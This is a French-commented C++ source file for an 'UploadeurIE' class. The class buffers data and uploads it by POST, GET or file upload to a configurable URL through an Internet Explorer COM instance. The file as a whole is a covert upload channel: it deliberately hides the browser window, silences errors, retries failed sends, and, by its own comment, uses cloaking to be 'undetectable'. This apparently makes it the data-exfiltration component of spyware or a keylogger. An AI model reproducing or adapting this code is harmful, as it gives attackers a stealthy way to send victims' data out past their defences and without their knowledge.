/*!
* \file UploadeurIE.cpp
* Fichier source de la classe UploadeurIE.
* \author Xavier Monin
* \date 30/10/2008
*/

#include "UploadeurIE.h"

#include <string>
#include <vector>
#include <Exdisp.h>
#include <atlbase.h>
#include <sstream>

#include <iostream>

//! Variable globale pour les sections critiques
CRITICAL_SECTION critical_section;

/*!
* \brief Constructeur de UploadeurIE.
* \param[in] url : Site � contacter
* \param[in] methode : POST? GET? FILE?
* \param[in] element : Utilis� seulement pour POST et FILE. C'est le nom du contenant (ex: Acc�s en PHP: $_POST['$element'])
* \param[in] taille : Taille du buffer (2048 octets par d�faut). Lorsque cette taille est atteinte, les donn�es sont envoy�es
*/
UploadeurIE::UploadeurIE(std::string url, METHODE_ENVOI methode, 
									   std::string element, size_t taille)
									   : taille_buffer(taille), string_url(url),
									   methode_envoi(methode), string_element(element),
									   thread_en_cours(false)
{
	// Initialise la variable pour les sections critiques (=> synchronisation thread)
	InitializeCriticalSection(&critical_section);
}

/*!
* \brief Destructeur de UploadeurIE.
*/
UploadeurIE::~UploadeurIE()
{
	// Si le buffer est encore plein on envoi son contenu
	if (!vector_buffer.empty())
		mettreEnLigneBufferSansThread();
}

/*!
* \brief Mets en ligne le buffer par un thread.
* Mets en ligne le buffer par un thread. Il est ainsi possible de remplir le buffer pendant qu'il s'envoi
*/
void UploadeurIE::creerThread()
{
	if (thread_en_cours)
		return; // Un thread a d�ja �t� lanc�, on n'en cr�e pas un autre

	DWORD thread=0;
	if (CreateThread(NULL, NULL, UploadeurIE::mettreEnLigneBufferAvecThread, (LPVOID)this, NULL, &thread))
		thread_en_cours=true; // Le thread est lanc�
}


/*!
* \brief Envoi les donn�es p�riodiquement.
* Envoi les donn�es en ligne si le buffer est plein sinon stock les donn�es dans le buffer
* Fonction surcharg�e acceptant les chaines string
* \param[in] chaine : Donn�es � envoyer
*/
void UploadeurIE::envoyerDonnees(const std::string& chaine)
{
	size_t longueur_totale=vector_buffer.size()+chaine.size();

	std::cout << chaine.c_str();

	// Conversion de la chaine string en vector<char>
	ListeChars donnees=stringVersVector(chaine);

	// On envoi les donn�es si le buffer est plein sinon on ajoute les donn�es au buffer
	if ( longueur_totale >= taille_buffer )
		envoyerDonneesMaintenant(chaine);
	else
	{
		// On rempli le buffer dans une partie critique
		// pour ne pas le modifier en m�me temps que le thread le lit
		EnterCriticalSection(&critical_section);
		vector_buffer.insert(vector_buffer.end(), donnees.begin(), donnees.end());
		LeaveCriticalSection(&critical_section);
	}
}

/*!
* \brief Envoi directement les donn�es.
* Fonction surcharg�e acceptant les chaines string
* \param[in] chaine : Donn�es � envoyer
*/
void UploadeurIE::envoyerDonneesMaintenant(const std::string& chaine)
{
	if (!chaine.empty())
	{
		// Conversion de string vers vector<char>
		ListeChars donnees=stringVersVector(chaine);

		// On ajoute les donn�es au buffer dans une partie critique
		// puisqu'il y a un risque que le thread le lise en m�me temps qu'il se remplisse
		EnterCriticalSection(&critical_section);
		vector_buffer.insert(vector_buffer.end(), donnees.begin(), donnees.end());
		LeaveCriticalSection(&critical_section);
	}

	// On cr�e le thread
	creerThread();
}

/*!
* \brief Envoi directement les donn�es.
* Fonction surcharg�e acceptant les vector<char>
* \param[in] donnees : Donn�es � envoyer
*/
void UploadeurIE::envoyerDonneesMaintenant(const ListeChars& donnees)
{
	// On ajoute les donn�es au buffer dans une partie critique
	// puisqu'il y a un risque que le thread le lise en m�me temps qu'il se remplisse
	EnterCriticalSection(&critical_section);
	vector_buffer.insert(vector_buffer.end(), donnees.begin(), donnees.end()); 
	LeaveCriticalSection(&critical_section);

	// On cr�e le thread
	creerThread();
}

/*!
* \brief Thread mettant en ligne le buffer.
* \param[in,out] objet : Objet UploadeurIE sur lequel le thread s'applique
* \return 0
*/
DWORD UploadeurIE::mettreEnLigneBufferAvecThread(LPVOID objet)
{
	// Transtype en objet UploadeurIE
	UploadeurIE *mettre_en_ligne = (UploadeurIE*) objet;

	// On copie le buffer dans le buffer d'envoi et on efface le buffer
	// C'est ce buffer d'envoi qui sera envoy�
	// Cel� permet de continuer � remplir le buffer pendant qu'on envoi l'autre
	// Cette op�ration ce fait dans une section critique
	// puisque le buffer peut �tre modifier pendant qu'il est copi�
	EnterCriticalSection(&critical_section);
	mettre_en_ligne->vector_buffer_envoi = mettre_en_ligne->vector_buffer;
	mettre_en_ligne->vector_buffer.clear();
	LeaveCriticalSection(&critical_section);

	if (!mettre_en_ligne->mettreEnLigneBuffer())
	{
		// Le buffer n'a pa pu �tre mis en ligne
		// On remet le buffer d'envoi dans le buffer
		// Toujours dans une section critique � cause des modifications
		EnterCriticalSection(&critical_section);
		mettre_en_ligne->vector_buffer.insert(mettre_en_ligne->vector_buffer.begin(),
											  mettre_en_ligne->vector_buffer_envoi.begin(),
											  mettre_en_ligne->vector_buffer_envoi.end());
		LeaveCriticalSection(&critical_section);
	}

	// Vide le buffer d'envoi
	// Le thread s'est termin�
	// Toujours dans une section critique � cause des modifications
	EnterCriticalSection(&critical_section);
	mettre_en_ligne->vector_buffer_envoi.clear();
	mettre_en_ligne->thread_en_cours=false;
	LeaveCriticalSection(&critical_section);

	return 0;
}

/*!
* \brief Met en ligne sans thread.
* Met en ligne le buffer sans utiliser de thread, et donc bloquant
* \return true si tout s'est bien d�roul�
*/
bool UploadeurIE::mettreEnLigneBufferSansThread()
{
	bool deroulement;

	// On remplie le buffer d'envoi
	vector_buffer_envoi = vector_buffer;
	
	// On met en ligne
	deroulement = mettreEnLigneBuffer();

	if (deroulement)
		vector_buffer.clear(); // Tout s'est bien pass�, on efface le buffer

	vector_buffer_envoi.clear();

	return deroulement;
}

/*!
* \brief Met en ligne les donn�es.
* \return true si tout c'est bien pass�, sinon false
*/
bool UploadeurIE::mettreEnLigneBuffer()
{
	// Initialise COM
	CoInitialize(NULL);

	bool valeur_retour;

	IWebBrowser2 * pBrowser2 = NULL;

	// Cr�ation de l'instance Internet Explorer. CLSCTX_ENABLE_CLOAKING le rend ind�tectable
	CoCreateInstance(CLSID_InternetExplorer, NULL, CLSCTX_ENABLE_CLOAKING | CLSCTX_LOCAL_SERVER, 
                   IID_IWebBrowser2, (void**)&pBrowser2);

	if (pBrowser2)
	{
		HRESULT hr;

		// Internet Explorer ne doit pas �tre visible et ne pas afficher d'erreur !
		pBrowser2->put_Silent(VARIANT_TRUE);
		pBrowser2->put_Visible(VARIANT_FALSE);


		// Cr�ation d'un VARIANT vide
		CComVariant vEmpty;

		// URL
		BSTR bstr_url;

		// Header
		CComVariant vHeader;
		vHeader.vt = VT_BSTR;
		vHeader.bstrVal=0;

		// POST
		CComVariant postData;

		// GET
		std::string string_get;

		if (extension != NULL)
		{
			(*extension) << vector_buffer_envoi;
			vector_buffer_envoi = extension->resultat();
		}

		// POST? FILE ? GET?
		switch(methode_envoi)
		{
			case METHODE_POST:
				{
					std::string buffer = encoderURL(vectorVersString(vector_buffer_envoi));

					buffer = encoderURL(string_element)+"="+buffer;

					stringVersVariantArray(buffer, postData);

					// HEADER pour methode POST
					stringVersBSTR("Content-Type: application/x-www-form-urlencoded", &vHeader.bstrVal);
					break;
				}
			case METHODE_FILE:
				{
					std::string buffer="--AaB03x\r\n";
					ListeChars donnees;
					buffer+="content-disposition: ";
					// Le nom du fichier aura le m�me nom que l'�l�ment
					buffer+="form-data; name=\""+encoderURL(string_element)+"\"; filename=\""+ string_element +"\"\r\n";
					buffer+="Content-Transfer-Encoding: binary\r\n\r\n";
					donnees = stringVersVector(buffer);
					// Ajoute au d�but du buffer les indications de la m�thode FILE
					vector_buffer_envoi.insert(vector_buffer_envoi.begin(), donnees.begin(), donnees.end());

					// Ajoute � la fin du buffer l'indication de fin de la m�thode FILE
					buffer="\r\n--AaB03x--";
					donnees = stringVersVector(buffer);
					vector_buffer_envoi.insert(vector_buffer_envoi.end(), donnees.begin(), donnees.end());

					vectorVersVariantArray(vector_buffer_envoi, postData);

					// HEADER pour methode FILE
					stringVersBSTR("Content-type: multipart/form-data, boundary=AaB03x", &vHeader.bstrVal);
					break;
				}
			case METHODE_GET:
				{
					std::string get = encoderURL(vectorVersString(vector_buffer_envoi));
					string_get = "/?"+encoderURL(string_element)+"="+get;
				}
		}

		// Cr�ation du lien vers le site (URL)
		stringVersBSTR(string_url+string_get, &bstr_url);

		// On met en ligne !
		hr = (pBrowser2->Navigate(bstr_url, &vEmpty, &vEmpty, &postData, &vHeader));

		// Lib�ration de la m�moire
		if (bstr_url)
			SysFreeString(bstr_url);
		if (vHeader.bstrVal)
			SysFreeString(vHeader.bstrVal);

		VARIANT_BOOL occupe = VARIANT_TRUE;

		// On attend que les donn�es soient envoy�es
		while(occupe == VARIANT_TRUE)
		{
			Sleep(100);
			pBrowser2->get_Busy(&occupe);
		}

		// On ferme Internet Explorer
		pBrowser2->Quit();

		// On lib�re la m�moire de l'instance
		pBrowser2->Release();

		valeur_retour = SUCCEEDED(hr);
	}
	else
		valeur_retour=false;

	// On n'utilise plus COM
	CoUninitialize();

	return valeur_retour;
}

/*!
* \brief Encode un texte en URL.
* Encode un texte en URL (Ex: "Bonjour, comment allez vous ?" => "Bonjour%2c%20comment%20allez%20vous%20%3f")
* \param[in] texte : Texte � encoder
* \return string encod�
*/
std::string UploadeurIE::encoderURL(const std::string texte)
{
	std::string encode;
	for (size_t i=0; i<texte.size(); i++)
	{
		if ( (texte[i]>='0' && texte[i]<='9') || (texte[i]>='A' && texte[i]<='Z') || (texte[i]>='a' && texte[i]<='z') )
		{
			// Pas besoin d'encoder les alphanumeriques
			encode += texte[i];
			continue;
		}

		// Encodage en hexad�cimal
		std::ostringstream chaine_hexa;
		chaine_hexa << std::hex << ((size_t)texte[i])%256; // %256 permet de se limiter � 1 octet. % => cyclique

		encode += '%';
		encode += chaine_hexa.str();
	}
	return encode;
}

/*!
* \brief Converti un string en CComVariant.
* Cr�e un CComVariant Array (un tableau) � partir d'un string (chaine de caract�re)
* \param[in] chaine : La chaine de caract�res qui sera converti
* \param[out] variant_array : R�f�rence sur le CComVariant qui sera charg�
*/
void UploadeurIE::stringVersVariantArray(const std::string & chaine, CComVariant & variant_array)
{
	int longueur = chaine.size();
	// variant_array est un tableau (VT_ARRAY) de la taille de chaine
	variant_array.vt = VT_ARRAY;
	variant_array.parray = SafeArrayCreateVector(VT_UI1, 0, longueur);

	// On copie (par memcpy) chaine dans variant_array via donnes_proteges qui pointe sur variant_array
	void * donnes_proteges;
	SafeArrayAccessData(variant_array.parray, &donnes_proteges);
	memcpy(donnes_proteges, chaine.c_str(), longueur);
	SafeArrayUnaccessData(variant_array.parray);
}

/*!
* \brief Converti un vector<char> en CComVariant.
* Cr�e un CComVariant Array (un tableau) � partir d'un vector<char> (tableau de caract�res)
* \param[in] donnees : Le tableau de caract�res qui sera converti
* \param[out] variant_array : R�f�rence sur le CComVariant qui sera charg�
*/
void UploadeurIE::vectorVersVariantArray(const ListeChars & donnees, CComVariant & variant_array)
{
	int longueur = donnees.size();

	// variant_array est un tableau (VT_ARRAY) de la taille de chaine
	variant_array.vt = VT_ARRAY;
	variant_array.parray = SafeArrayCreateVector(VT_UI1, 0, longueur);

	// On copie (par memcpy) donnees dans variant_array via donnes_proteges qui pointe sur variant_array
	void * donnes_proteges;
	SafeArrayAccessData(variant_array.parray, &donnes_proteges);
	memcpy(donnes_proteges, &donnees[0], longueur);
	SafeArrayUnaccessData(variant_array.parray);
}

/*!
* \brief Converti un string en BSTR.
* Cr�e un BSTR (chaine de caract�re unicode) � partir d'un string (chaine de caract�re ASCI)
* \param[in] chaine : La chaine de caract�re qui sera converti
* \param[out] bstr : Pointeur sur BSTR qui sera charg�. A noter que ce pointeur doit �tre lib�r� apr�s utilisation !
*/
void UploadeurIE::stringVersBSTR(const std::string chaine, BSTR * bstr)
{
	if (!chaine.empty())
	{
		unsigned long longueur_chaine = chaine.size();

		// On calcul la taille que devra avoir le bstr pour contenir chaine
		int longueur_bstr = MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, reinterpret_cast <const char *>(chaine.c_str()),
												longueur_chaine, NULL, 0);

		// On alloue la place � bstr
		*bstr = SysAllocStringLen(NULL, longueur_bstr);
        
		// On copie chaine dans bstr (en le convertissant)
		MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, reinterpret_cast <const char *>(chaine.c_str()),
							longueur_chaine, *bstr, longueur_bstr); 
    }
}
